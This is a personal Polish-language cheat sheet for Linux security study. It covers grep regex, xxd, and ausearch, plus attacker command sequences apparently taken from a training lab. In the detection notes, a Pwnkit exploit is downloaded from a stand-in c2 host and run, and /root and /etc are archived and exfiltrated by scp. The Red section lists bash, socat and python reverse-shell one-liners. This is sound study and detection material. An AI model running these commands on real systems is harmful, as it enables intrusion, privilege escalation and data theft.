#Overall
## Find
```
sudo find / -name ".env.local" -type f 2>/dev/null
```
## Grep
Extended Regular Expression
\ (Wyjscie ze znaku specjalnego) omija znaki akcji.
| (Alternatywa): Szuka jednego lub drugiego wzorca.
``` 
grep -E "Failed|Accepted" /var/log/auth.log
#(znajdzie próby logowania udane i nieudane).
```

\+ (Jeden lub więcej): Dopasowuje co najmniej jedno wystąpienie poprzedniego znaku.
```
grep -E "log+"
#(znajdzie "log", "logg", "loggg").
```
? (Zero lub jedno): Sprawia, że poprzedni znak jest opcjonalny.
``` 
grep -E "https?"
#(znajdzie zarówno "http", jak i "https").
``` 
{n,m} (Kwantyfikatory): Pozwala określić dokładną liczbę powtórzeń.
```
grep -E "[0-9]{1,3}"
#(szuka od jednej do trzech cyfr).
```
##xxd
###Podstawowy podgląd
```
xxd plik.bin
# Wyświetla: Offset | Hex | ASCII
```
###Magic Bytes (Identyfikacja typu pliku)
```
xxd -l 16 plik.bin
# -l [długość]: Wypisuje tylko określoną liczbę bajtów. Pozwala sprawdzić nagłówek (np. ELF, PNG).
```
### Konwersja na czysty Hex (Plain)
```
xxd -p plik.txt
# Wypisuje tylko wartości hex, bez offsetów i ASCII. Przydatne do skryptów.
```
###Zmiana formatowania kolumn
```
xxd -c 8 plik.bin
#-c [liczba]: Określa, ile bajtów ma być w jednej linii (domyślnie 16). Pomaga dopasować widok.
```
###Reverse - odzyskiwanie pliku ze zrzutu
```
xxd -r zrzut_hex.txt > plik_wynikowy.bin
#Zamienia tekstowy zapis hex z powrotem na plik binarny.
```
###Eksport do tablicy C
```
xxd -i plik.bin
#Formatuje zawartość jako zmienną typu char[] (idealne do wrzucania shellcode do exploita).
```


## Notatki
### Detection 1: A Spike of Discovery Commands
```
whoami                                                # Returns "www-data" user
id; pwd; ls -la; crontab -l                           # Basic initial Discovery
ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
uname -r                                              # Returns an old 4.4 kernel
```
### Detection 2: A Download to Temp Directory
```
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
chmod +x /tmp/pwnkit                                  # Making exploit executable
/tmp/pwnkit                                           # Trying to use the exploit
```
### Detection 3: Data Exfiltration With SCP
```
whoami                                                # Now returns "root" user
tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
```
# Red
## Reverse shell
```
bash -i >& /dev/tcp/10.10.10.10/1337 0>&1
socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane
python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'
```
## Notatki
### Jeśli masz ograniczony shell i nie możesz przesłać pliku, możesz go "wypluć" jako tekst i skopiować:
```
xxd -p tajny_plik.zip > data.hex
# Na maszynie atakującego:
xxd -r -p data.hex > odzyskany_plik.zip
```
# Blue
## Ausearch
```
ausearch -i -x socat # Look for suspicious commands
```
```
ausearch -i --pid 27806 # Find its parent process and build a process tree
```
```
ausearch -i --ppid 27808 | grep proctitle # List all its child processes
```
```
ausearch -i -f /etc/systemd # Look for file changes inside /etc/systemd
```
##Notatki
###Sprawdzenie, czy skrypt nie ukrywa w sobie bajtów wykonywalnych:
```
xxd suspicious_script.sh | head -n 20
```
